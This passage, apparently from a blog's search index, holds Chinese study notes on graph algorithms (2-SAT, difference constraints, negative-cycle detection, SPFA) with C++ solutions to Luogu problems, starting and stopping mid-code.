class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            vis[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    sel[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(sel[(u<span class="number">-1</span>)%n+<span class="number">1</span>]&amp;&amp;sel[(u<span class="number">-1</span>)%n+n+<span class="number">1</span>])&#123;</span><br><span class="line">        sel[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(sel[v]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(v))&#123;</span><br><span class="line">                sel[u]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,z,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;z&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x+(y)*n,z+(!w)*n);</span><br><span class="line">        <span class="built_in">add</span>(z+(w)*n,x+(!y)*n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i]==num[i+n])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;IMPOSSIBLE\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sel[i]==<span class="number">0</span>&amp;&amp;sel[i+n]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(i))&#123;</span><br><span class="line">                <span class="built_in">dfs</span>(i+n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;POSSIBLE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sel[i]&gt;sel[i+n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 2-SAT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>差分约束的学习笔记</title>
      <link href="/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>差分约束系统，就是给出一组形如 $x_i-x_j\le d$ 的不等式，求出这组不等式的一组解。这类问题通常转化为图论中的最短路来解。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>那我们转换一下，假设 $x_i$ 为点 $i$ 的单源最短路长度，$x_j$ 为点 $j$ 的单源最短路长度。那么以上不等式就可以转换成 $dis[i]-dis[j]\le d\to dis[i]\le dis[j]+d$。</p><p>那么这个就转变成了 $j\to i$ 一条权值为 $d$ 的边的最短路搜索了。因为如果一条边 $i\to j$ 权值为 $d$ ，那么必然有 $dis[i]\le dis[j]+d$ ，如果不满足这个条件。我们用反证法证明一下这个结论，设一条边 $i\to j$ 权值为 $d$，且满足 $dis[i] &gt; dis[j]+d$，那么在一次单源最短路算法时，必然会导致 $i$ 点被松弛。即发生</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dis[i]&gt;dis[j]+d)&#123;</span><br><span class="line">    dis[i]=dis[j]+d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以得出结论：$dis[i]$ 一定不会比 $dis[j]+d$ 大，当 $i\to j$ 有一条权值为 $d$ 的边时。当然可以比它小，如果其它边有更短的走法。</p><p>所以当存在不等式 $x_i-x_j\le d$ 的时候，我们只需要建一条 $i\to j$ 权值为 $d$ 的边就能满足这个不等式了。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们就根据不等式组建图，然后跑单源最短路。这里需要注意的是，如果图不连通，那并不是无解，说明它们不在同一个不等式组，相互之间都没有关联，那就分别求单源最短路即可。为了防止这个情况，我们一般都会添加一个超级源点，这个源点为 $0$ 或者是 $n+1$。然后建立一条源点到其它所有点的一条权值为 $d$ 的有向边。 </p><p>我们添加了 $0\to i(1\le i\le n)$ 权值为 $0$ 的有向边，相当于增加了以下约束条件：</p><p>$dis[i]\le dis[0]+0$ </p><p>添加这个约束条件问题是不大的，因为我们很容易看出来，在找到一组解的时候，给所有的未知数都加上一个相同的值，是不会影响结果的。这个结论是很容易的出来的，因为我们的表达式都是一正一负，然后带进不等式之后加上的常数都会消掉，还能解决图不连通的问题，一举多得。添加这个约束条件之后，我们可以发现得到的值一定都是负数，那么如果一定要正解的话，那么直接给所有的dis加上一个 $\max(dis)$ 就完了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://www.luogu.com.cn/problem/P5960">洛谷P5960</a></p><p>就依然是一个板子，然后最后判断以下负环无解的情况，没有就输出所有的 $dis$。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt,n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    dis[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    e_cnt[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    in_que[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                e_cnt[v]++;</span><br><span class="line">                <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m; </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,i,<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> M=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dis[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 差分约束 </category>
          
          <category> 单源最短路 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>负环判断</title>
      <link href="/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/"/>
      <url>/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>前面讲到了<code>spfa</code>，然后有一个判断负环的操作，这个判断负环有更好的思路。</p><span id="more"></span><p>设$cnt[i]$为$s$到$i$的最短路中已经经过的路径条数，如果超过 $n$ 个边，那就说明有 $n-1$ 个点，必产生了负环，如果没有负环绝对是不会找到回路的。</p><h2 id="洛谷P3385"><a href="#洛谷P3385" class="headerlink" title="洛谷P3385"></a><a href="https://www.luogu.com.cn/problem/P3385">洛谷P3385</a></h2><p>emm直接给标程吧，就是最朴实无华的 $spfa$ 负环判断。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(e_cnt,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(e_cnt));</span><br><span class="line">    <span class="built_in">memset</span>(in_que,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(in_que));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    e_cnt[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                    e_cnt[v]++;</span><br><span class="line">                    <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3385_9.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">        <span class="built_in">memset</span>(edge,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(edge));</span><br><span class="line">        cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x,y,w;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">            <span class="built_in">add</span>(x,y,w);</span><br><span class="line">            <span class="keyword">if</span>(w&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(y,x,w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">spfa</span>(<span class="number">1</span>))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 负环 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>spfa算法的学习</title>
      <link href="/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/21/spfa%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>勇敢小鸡，不怕困难。时隔多日，又来复习图论算法了，本来想的是搞一下差分约束的，但是发现前置知识是<code>spfa</code>算法，所以就先来学习一下这个。</p><span id="more"></span><h2 id="spfa算法介绍"><a href="#spfa算法介绍" class="headerlink" title="spfa算法介绍"></a>spfa算法介绍</h2><p>SPFA算法是求解单源最短路径问题的一种算法，由理查德·贝尔曼（Richard Bellman） 和 莱斯特·福特 创立的。有时候这种算法也被称为 Moore-Bellman-Ford 算法，因为 Edward F. Moore 也为这个算法的发展做出了贡献。它的原理是对图进行V-1次松弛操作，得到所有可能的最短路径。<strong>其优于dijkstra算法的方面是边的权值可以为负数、实现简单，缺点是时间复杂度过高，高达 O(VE)。但算法可以进行若干种优化，提高了效率。</strong></p><p>算法的思路：<br>我们用数组dis记录每个结点的最短路径估计值，用邻接表或邻接矩阵来存储图G。我们采取的方法是动态逼近法：设立一个先进先出的队列用来保存待优化的结点，优化时每次取出队首结点u，并且用u点当前的最短路径估计值对离开u点所指向的结点v进行松弛操作，如果v点的最短路径估计值有所调整，且v点不在当前的队列中，就将v点放入队尾。这样不断从队列中取出结点来进行松弛操作，直至队列空为止</p><p>我们要知道带有负环的图是没有最短路径的，所以我们在执行算法的时候，要判断图是否带有负环，方法有两种：</p><ol><li>开始算法前，调用拓扑排序进行判断（一般不采用，浪费时间）</li><li>如果某个点进入队列的次数超过N次则存在负环（N为图的顶点数）</li></ol><h2 id="spfa算法浅谈"><a href="#spfa算法浅谈" class="headerlink" title="spfa算法浅谈"></a>spfa算法浅谈</h2><p><code>spfa</code>算法的话，一般单源最短路基本用不到 ，<code>dijkstra</code>算法比它优很多，唯有需要处理负权图的时候会想到他。差分约束无解的情况就是存在负环，因此这个得学。</p><p>大概流程可以描述为以下文字。</p><ol><li>源点入队，源点距离初始化为0，其它初始化为 $inf$。</li><li>出队一个点并遍历与之之间相连的点，进行松弛操作。也就是我们经常见到的 <code>if(dis[to]&gt;w+dis[from])dis[to]=dis[from+w]</code>。</li><li>如果对一个点进行了松弛那么判断它有没有在队列中，如果不在则入队，并判断入队次数有没有超过点的个数，如果超过则goto 6。</li><li>如果队列不为空则goto 2。</li><li>结束，输出结果。</li><li>结束，输出存在负环的对应答案。</li></ol><p>下面来一道例题。</p><h2 id="洛谷P1396"><a href="#洛谷P1396" class="headerlink" title="洛谷P1396"></a><a href="https://www.luogu.com.cn/problem/P1396">洛谷P1396</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>妈妈下班回家，街坊邻居说小明被一群陌生人强行押上了警车！妈妈丰富的经验告诉她小明被带到了 t 区，而自己在 s区。</p><p>该市有 m 条大道连接 n 个区，一条大道将两个区相连接，每个大道有一个拥挤度。小明的妈妈虽然很着急，但是不愿意拥挤的人潮冲乱了她优雅的步伐。所以请你帮她规划一条从 s 至 t 的路线，使得经过道路的拥挤度最大值最小。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题其实有点差强人意，因为这个是要判断所经过边的最大值的最小值，但是我们主要还是练习spfa为主。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,dis[maxn],in_que[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span 